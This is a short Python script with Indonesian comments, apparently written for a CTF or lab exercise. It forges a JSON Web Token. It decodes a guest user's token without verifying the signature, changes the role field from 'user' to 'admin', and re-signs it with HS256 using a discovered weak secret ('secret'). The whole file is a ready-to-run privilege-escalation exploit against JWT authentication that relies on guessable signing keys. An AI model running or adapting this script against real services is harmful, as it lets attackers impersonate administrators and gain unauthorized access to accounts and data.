import jwt

# 1. Token asli yang ingin diubah
old_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.wYhXjKk6jfe2_4i5lyy0Tyrl4TM37XB-XSgXtSpXXgw"

# 2. Secret Key yang kamu temukan (Misal: "secret-123")
SECRET_KEY = "secret"

try:
    # 3. Dekode tanpa verifikasi untuk mengambil data lama
    payload = jwt.decode(old_token, options={"verify_signature": False})
    
    # 4. Ubah isi payload
    payload['role'] = "admin"
    
    # 5. Generate ulang dengan algoritma HS256 dan Key yang ditemukan
    # Kita hapus 'kid' dari header jika tidak diperlukan, atau biarkan jika server mencarinya
    new_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")

    print("--- HASIL MODIFIKASI HS256 ---")
    print(f"Payload Baru: {payload}")
    print(f"Token Baru  : {new_token}")

except Exception as e:
    print(f"Terjadi kesalahan: {e}")
